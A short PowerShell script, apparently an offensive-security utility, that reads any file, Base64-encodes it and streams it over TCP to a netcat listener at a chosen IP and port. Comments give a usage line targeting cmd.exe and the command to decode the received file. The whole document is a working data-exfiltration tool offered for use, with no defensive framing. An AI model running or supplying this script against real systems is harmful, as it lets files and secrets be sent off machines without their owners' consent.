#the output received on the netcat listener will be Base64 encoded. Decode via "cat file.b64 | base64 -d > file.exe"
# run ".\sendFile -ip 192.168.0.127 -port 3333 -filepath C:\windows\system32\cmd.exe
Param (
    [Parameter(Mandatory=$true)]
    [ValidateNotNullOrEmpty()]
    [string]
    $ip
    ,
    [Parameter(Mandatory=$true)]
    [ValidateNotNullOrEmpty()]
    [int]
    $port
     ,
    [Parameter(Mandatory=$true)]
    [ValidateNotNullOrEmpty()]
    [string]
    $filepath
  )


$file=[System.Convert]::ToBase64String([io.file]::ReadAllBytes($filepath));
$Socket = New-Object System.Net.Sockets.TCPClient($ip, $port);
$Stream = $Socket.GetStream();
$Writer = New-Object System.IO.StreamWriter($Stream);
$Writer.WriteLine($file);
$Writer.Flush();
$Stream.Close();
$Socket.Close();
